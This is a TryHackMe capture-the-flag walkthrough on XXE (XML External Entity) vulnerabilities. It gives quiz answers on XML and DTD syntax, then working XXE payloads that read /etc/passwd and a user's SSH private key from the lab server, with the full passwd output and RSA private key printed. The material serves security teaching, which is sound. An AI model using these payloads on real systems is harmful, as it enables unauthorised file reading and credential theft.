# XXE

[XXE]() is a TryHackMe CTF.
Focusses on XML exploitation.
XML External Entity vulnerability.

## Intro

XXE abuses XML parsers.
Can allows attacker to interact with backend.
Enables file reading, denial of service, server ride request forgery.
May even enable port-scanning and remote code execution.

There are two types of attacks:

1. In-band XXE
	- Immediate response to payload
2. Out-band XXE
	- aka. Blind XXE
	- Non-immediate response
	- Requires output to be reflected elsewhere

## eXtensible Markup Language

1. Full form of XXE
	```
	extensible markup language
	```
2. Is XML case sensitve?
	```
	yes
	```
3. Is it compulsor to have XML prolog in XML documents?
	```
	no
	```
4. Can we validate XML documents againts so schema?
	```
	yes
	```
5. How can we specifiy XML version and encoding in XML document?
	```
	xml prolog
	```

## DTD

1. What what extension do you save a DTD file?
	```
	dtd
	```
2. How do you define a new ELEMENT?
	```
	!ELEMENT
	```
3. How do you define a ROOT element?
    ```
	!DOCTYPE
    ```
4. How do you define a new ENTITY?
    ```
	!ENTITY
    ```

## XXE Payloads

This _tests_ if XXE vulnerable. Replaces lastName field with 'feast'.

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

This pulls server passwd file.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```


## Exploiting

We can use the above, first payload to display our name.

And, the second above payload to `cat` the /etc/passwd from the server.

```xml
<?xml version="1.0"?>                                                                                             
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>                                                      
<root>&read;</root>  
```

This returns..

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash 
```

From this we can see the user `falcon`. 

We can try pull `falcon`'s SSH key will the following payload.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
<root>&read;</root>
```

Which returns the private key.

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA7bq7Uj0ZQzFiWzKc81OibYfCGhA24RYmcterVvRvdxw0IVSC
lZ9oM4LiwzqRIEbed7/hAA0wu6Tlyy+oLHZn2i3pLur07pxb0bfYkr7r5DaKpRPB
2Echy67MiXAQu/xgHd1e7tST18B+Ubnwo4YZNxQa+vhHRx4G5NLRL8sT+Vj9atKN
MfJmbzClgOKpTNgBaAkzY5ueWww9g0CkCldOBCM38nkEwLJAzCKtaHSreXFNN2hQ
IGfizQYRDWH1EyDbaPmvZmy0lEELfMR18wjYF1VBTAl8PNCcqVVDaKaIrbnshQpO
HoqIKrf3wLn4rnU9873C3JKzX1aDP6q+P+9BlwIDAQABAoIBABnNP5GAciJ51KwD
RUeflyx+JJIBmoM5jTi/sagBZauu0vWfH4EvyPZ2SThZPfEb3/9tQvVneReUoSA5
bu5Md58Vho6CD81qCQktBAOBV0bwqIGcMFjR95gMw8RS9m4AyUnUgf438kfja5Jh
NP36ivgQZZFBqzLLzoG9Y9jlGKjiSyMvW4u63ZacCKPTpp5P53794/UVU7JiM03y
OvavZ2QveJp5BndV5lOkcIEFwFRACDK1xwzDRzx/TNJLufztb2EheMc3stNuOMea
TLKlbG0Mp/c2az8vNN6HA0QiwxYlKZ58RfdsOfbsFxAltYNnzxy9UEieXtrWVg7X
Qfi/ZeECgYEA/pfgg6BClEmipXv8hVkLWe7VwlFf4RXnxfWyi6OqC/3Yt9Q9B4Ya
6bgLzk2vPNHgJt+g2yh/TzMX6sCC9IMYedc0faiJr/VISBm25qTjqIGctwt0D3nb
j60mSKKFbwDPxrcek/7WH1cWDcaLTDdL9KPLk1JQzbwDzojrE1TDD+cCgYEA7wsA
MPm4aUDikZHKhQ5OOge+wzPNXVR6Yy1VV3WZfxRCoEuq6fYEJsKB5tykfQPC8cUn
qwGvo8TiMHbQ9KmI5FabfBK8LswQ575bnLtMxdPyBCgYqlsAIkPYQAOizUVlrOOg
faKF5VknsONM9DC3ZNx5L1zQXbsIrWbEPsRlytECgYB7CXr/IZwLfeqUfu7yoq3R
sJKtbhYf+S4hhTPcOCQd13e8n10/HZg0CzXpZbGieusQ3lIml9Ouusp8ML0Y3aIe
f9pmP+UKnEdqUMMLg/RhowHRlD9qm0F4lf1CbQh/NK01I5ore6SPUM7fqWv4UWDr
wZzIfad/RbWxQooYtYXvUQKBgFDLcBIdpYX1x16aX1AfqLMWgRSrQqNj9UXmQa0g
83OvXmGdkbQoUfjjz1I/i10x00cycxjqpfn9htIIptG7J6i92SnTj0Vl9eTOQ1qz
N9y5qVhcURHrVh0+vy3LzNACv73y5gDw2L7PJoo0GYODn8j4eAFZJpg3qlQpovTw
HtOxAoGABqwywFKFNTYgrl17Rs4g3H1nc0EhOzGetRaRL2bcvQsZevuWyswp0Mbm
9nlgNAtxttsmfL+OU7nP3I4YQlyZed4luRWcRaXrvGMqfEL4wzRez5ZxMnZM/IlQ
9DBlD9C7t5MI3aXR3A5zFVVINomwHH7aGfeha1JRXXAtasLTVvA=
-----END RSA PRIVATE KEY-----
```

With the first 18 characters of the private key..
```
MIIEogIBAAKCAQEA7b
```


